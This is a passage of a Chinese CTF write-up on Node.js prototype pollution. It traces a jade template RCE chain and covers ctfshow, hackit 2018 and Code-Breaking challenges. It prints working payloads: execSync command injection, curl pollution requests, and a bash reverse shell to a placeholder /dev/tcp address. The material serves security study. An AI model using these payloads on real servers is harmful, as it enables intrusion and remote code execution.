class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>监视 node.line 值</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173326438.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173359572.png"></p><p>或者<code>Uncaught ReferenceError: node is not defined</code>，说明 node.line 存在原始的值，它不会去 Object 找污染的值</p><p>重新梳理一下调用栈</p><blockquote><p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p><ol><li>app.js :: res.render</li><li>jade/lib/index.js :: exports.__express</li><li>jade/lib/index.js :: exports.renderFile<ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li>jade/lib/index.js :: exports.compile<ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol><li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol></blockquote><p>进入 app.render 后可以看到获取了 options，触发 app 渲染引擎进行渲染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125170700643.png"></p><p>系列参数设置继续步过，进入 tryRender</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173138254.png"></p><p>可以看到，寻找到 app 的渲染引擎，并且设置为 jade，开始渲染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173338485.png"></p><p>this.engine 进入 jade 库</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173430135.png"></p><p>回到 node.line 打一下看看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174150498.png"></p><blockquote><p>TypeError: this[(“visit” + node.type)] is not a function</p></blockquote><p>找到 Compiler.visitNode，打个断点</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174434191.png"></p><p>拼接发现没有这个方法，遍历 ast 树，通常是通过“visit+节点类型”来遍历所有节点的，观察光标，按照他的默认值设置为 Block</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126183747677.png"></p><p>节点类型不合要求，测试所有节点类型如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode √<br>visitBlockComment√<br>visitComment√<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctype√<br>visitMixinBlock√<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126184235129.png"></p><blockquote><p>TypeError: plugin is not a function</p></blockquote><p>看报错还没有完成渲染，找到 jade 渲染完前的最后报错</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126212401866.png"></p><p>是一个判断，打进去的时候 self 是 undefined，可以污染</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231450129.png"></p><p>污染 title</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231900595.png"></p><p>污染 message</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126232004589.png"></p><p>污染 error，一开始传了一个 1，传 json 格式的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>补充，其实污染目标就是 node.line，一开始就污染 node.line 就可以知道只污染哪些属性即可，因为有些属性不配置的话，它要么有默认值，要么就是能部分渲染没完成，不影响我们的污染数据的执行</p><p>对于普通模板，只需要污染 self 和 line，有继承的模板需要污染 type</p><p>当有顶格 h=title 类型的需要污染 block 类型</p><p>jade 入口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<br>    options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp;<br>    process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span><br>  ) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>options.compileDebug</code> 无初始值，可以覆盖开启 Debug 模式，当然也有另外一种情况，部署时，没有正确配置 <code>req.app.get(&#39;env&#39;)</code> 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;compileDebug&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">1</span> &#125; &#125; &#125;<br></code></pre></td></tr></table></figure><p>另外<strong>this.debug</strong>哪里来？？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = (<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span> (<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure></blockquote><p>最终 Exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Code&quot;</span>,<br>      <span class="hljs-attr">&quot;self&quot;</span>: <span class="hljs-number">1</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>来个全家福</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211127000013927.png"></p><h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">if</span> (req.url.match(<span class="hljs-regexp">/8c|2c|\,/gi</span>)) &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>)<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query)<br>  <span class="hljs-keyword">if</span> (<br>    query.name === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp;<br>    query.password === <span class="hljs-string">&#x27;ctfshow&#x27;</span> &amp;&amp;<br>    query.isVIP === <span class="hljs-literal">true</span><br>  ) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>)<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>不能有 8c、2c、逗号</p><p>正常请求：</p><blockquote><p>?query={“name”:”admin”,”password”:”ctfshow”,”isVIP”:true}</p></blockquote><p>这里介绍一下 HPP 数据污染</p><blockquote><p>Web 服务器 　　　　　　 参数获取函数 　　　　　　　　　　 获取到的参数</p><p>PHP/Apache 　　 　　 $_GET(“par”) 　　　　　　　　　　 Last</p><p>JSP/Tomcat 　　　　 Request.getParameter(“par”) First</p><p>Perl(CGI)/Apache 　 Param(“par”) 　　　　　　　　　　 First</p><p>Python/Apache 　　 getvalue(“par”) 　　　　　　　　 All(List)</p><p>ASP/IIS 　　　　　　 Request.QueryString(“par”) 　　 All (comma-delimited string)</p></blockquote><p>而 nodejs 就是会将同名参数以数组进行存储，json.parse 也能正常解析</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”ctfshow”&amp;query=”isVIP”:true}</p></blockquote><p>逗号已经绕过，url 编码看一下</p><blockquote><p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p></blockquote><p>ctfshow 前面出现了一个%22，是双引号，和 c 成了 2c，c 得绕一下，进行 unicode 编码一下%63</p><p>payload：</p><blockquote><p>?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p></blockquote><h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span><br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr]<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span> (<span class="hljs-params">a</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a)<br>&#125;<br><br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span><br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br><span class="hljs-keyword">const</span> admin = &#123;&#125;<br><br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.json())<br>app.use(cookieParser())<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)))<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body))<br>  <span class="hljs-keyword">var</span> copybody = clone(body)<br>  <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>    res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>      <span class="hljs-attr">done</span>: <span class="hljs-string">&#x27;cookie set&#x27;</span><br>    &#125;)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.json(&#123;<br>      <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;cookie not set&#x27;</span><br>    &#125;)<br>  &#125;<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>  <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;<br>    res.send(<span class="hljs-string">&#x27;hackim19&#123;&#125;&#x27;</span>)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-string">&#x27;You are not authorized&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.listen(PORT, HOST)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;;<br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure><p>首先请求 /signup 接口，在 NodeJS 服务中，我们调用了有漏洞的 merge 方法，并通过<code>__proto__</code> 为 Object.prototype（因为 <code>&#123;&#125;.__proto__ === Object.prototype</code>） 添加上一个新的属性 admin，且值为 1。</p><p>再次请求 getFlag 接口，条件语句 <code>admin.аdmin == 1</code> 为 true，服务被攻击。</p><p>攻击案例出自：Prototype pollution attacks in NodeJS applications</p><p>这样的漏洞在 jQuery <code>$.extend </code>中也经常见到<br>对于 jQuery：如果担心安全问题，建议升级至最新版本 jQuery 3.4.0，如果还在使用 jQuery 的 1.x 和 2.x 版本，那么你的应用程序和网站仍有可能遭受攻击。</p><h4 id="登录绕过题"><a href="#登录绕过题" class="headerlink" title="登录绕过题"></a>登录绕过题</h4><p>{“user”:[0],”passwd”:[0]}</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png"></p><p>这题可以控制 host 参数去篡改 mysql 的连接地址 利用 mysql 客户端任意文件读取 <a href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p><p>但是如果直接在 json 中传递<code>&#123;&quot;host&quot;:&quot;&quot;&#125;</code>,根本不会有任何效果<br>在 57 行<br><code>if (body.host != undefined) &#123;</code><br>如果发现有直接传递进来的 host 参数，nodejs 就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，所以就可以通过构造如下参数去改变 host 参数，把 host 参数变成我们自己 mysql 服务器的地址<br>原题作者博客<a href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p><p>不用 host 参数篡改 mysql 地址 还可以利用原型链污染：<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//处理JSON数据</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//设置一下Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//调用ejs进行渲染</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//渲染内容</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//动态引入成员变量</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//传回来</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//将body中的数据传入sessioN中</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language,<br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//渲染自己的选择</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">var</span> user = [] <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span> (<span class="hljs-params">mat</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>) &#123;<br>        count += <span class="hljs-number">1</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span><br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>))<br>app.use(bodyParser.json())<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>)<br>morganBody(app)<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express)<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>  &#125;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>)<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">/*this is under development I guess ??*/</span><br>  <span 